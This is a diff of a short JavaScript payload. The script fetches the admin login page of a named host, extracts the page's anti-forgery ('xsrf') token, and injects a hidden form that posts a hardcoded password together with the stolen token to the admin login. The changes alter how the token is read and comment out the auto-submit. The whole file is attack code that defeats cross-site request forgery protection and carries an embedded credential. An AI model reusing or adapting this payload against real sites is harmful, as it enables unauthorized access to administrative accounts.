@@ -1,8 +1,9 @@
 var page = 'https://redhatdev.compunnel.com/platform/admin/login?next=%2Fplatform%2Fadmin';
 var html = get(page);
 document.body.innerHTML = html;
-var form = document.getElementById('form');
-var token = form.token.value;
+var form = document.forms[0];
+var token = form.xsrf.value;
+form.xsrf.value = "";
 
 document.body.innerHTML +=
 	 '<form id="myform" action="' + page + '" method="POST">'
@@ -10,10 +11,12 @@ document.body.innerHTML +=
 	+'<input type="password" name="password" value="redhat">'
 	+'<input type="hidden" name="next" value="">'
 	+'<input type="hidden" name="xsrf" value="' + token + '">'
+	+'<input type="submit" name="submit">'
 	+'</form>';
 
-document.forms["myform"].submit();
+//document.forms["myform"].submit();
 
+//alert(form.xsrf.value +" \n "+token);
 function get(url) {
     var xmlHttp = new XMLHttpRequest();
     xmlHttp.open("GET", url, false);
